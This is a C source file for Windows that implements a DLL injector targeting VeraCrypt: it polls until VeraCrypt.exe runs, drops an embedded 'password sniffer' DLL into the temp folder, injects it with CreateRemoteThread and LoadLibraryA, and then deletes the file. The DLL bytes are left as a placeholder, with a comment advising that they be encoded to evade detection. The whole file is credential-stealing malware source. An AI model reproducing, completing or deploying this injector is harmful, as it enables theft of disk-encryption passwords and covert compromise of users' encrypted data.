
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>

unsigned char passwordsniffer_DLL_PE[X] = {
 // hexa code of Dll you wanna inject
 // encode is advice @ this step
};

int SearchForProcess(const char *processName) {
        HANDLE hSnapshotOfProcesses;
        PROCESSENTRY32 processStruct;
        int pid = 0;
                
        hSnapshotOfProcesses = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshotOfProcesses) return 0;
        processStruct.dwSize = sizeof(PROCESSENTRY32); 
        if (!Process32First(hSnapshotOfProcesses, &processStruct)) {
			CloseHandle(hSnapshotOfProcesses);
			return 0;
        }
                
        while (Process32Next(hSnapshotOfProcesses, &processStruct)) {
			if (lstrcmpiA(processName, processStruct.szExeFile) == 0) {
				pid = processStruct.th32ProcessID;
				break;
			}
        }
        CloseHandle(hSnapshotOfProcesses);
                
        return pid;
}

char pathToDLL[512] = "";

void GetPathToDLL(){
	//Locate the created file in %TMP%
	GetTempPathA(512, pathToDLL);
	strcat(pathToDLL, "\\passwordVeraCryptSniffer.dll");
	printf("\nPath To DLL: %s\n", pathToDLL);
}

void unpackDLL(){
	HANDLE hDLL_File = CreateFile(pathToDLL, FILE_ALL_ACCESS, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	DWORD numBytes;
	
	if(hDLL_File == INVALID_HANDLE_VALUE)
		printf("Error unpacking DLL file\n");
	else
		WriteFile(hDLL_File, passwordsniffer_DLL_PE, sizeof(passwordsniffer_DLL_PE), &numBytes, NULL);
	CloseHandle(hDLL_File);
}

int main(int argc, char *argv[]) {
	HANDLE hProcess;
	PVOID pRemoteProcAllocMem;
	PTHREAD_START_ROUTINE pLoadLibrary = NULL;
	char processTargetedToInject[] = "VeraCrypt.exe";
	int pid = 0;
	
	//-- keep looping until VeraCrypt is running
	while(pid==0){
		pid = SearchForProcess(processTargetedToInject);
		Sleep(1000); //-- millisecs
	}
	
	//-- once VeraCrypt is in memory, we continue
	if(pid!=0){
		GetPathToDLL(); 
		unpackDLL(); 
		printf("Process To Inject PID: [ %d ]\nInjecting...", pid);
		pLoadLibrary = (PTHREAD_START_ROUTINE) GetProcAddress( GetModuleHandle("Kernel32.dll"), "LoadLibraryA");
		hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)(pid));

		if (hProcess != NULL) {
			pRemoteProcAllocMem = VirtualAllocEx(hProcess, NULL, sizeof(pathToDLL), MEM_COMMIT, PAGE_READWRITE);	
			WriteProcessMemory(hProcess, pRemoteProcAllocMem, (LPVOID) pathToDLL, sizeof(pathToDLL), NULL);
			CreateRemoteThread(hProcess, NULL, 0, pLoadLibrary, pRemoteProcAllocMem, 0, NULL);
			printf("done!\nallocated Memory addr = %p\n", pRemoteProcAllocMem);
			CloseHandle(hProcess); 
			
			//-- give time for DLL to inject and attach before deleting
			Sleep(5000);
			if(DeleteFile("passwordVeraCryptSniffer.DLL")== 0) OutputDebugStringA("Delete passwordVeraCryptSniffer.DLL file failed");
		}
		else {
			printf("OpenProcess failed! Exiting.\n");
			return -2;
		}
	}
}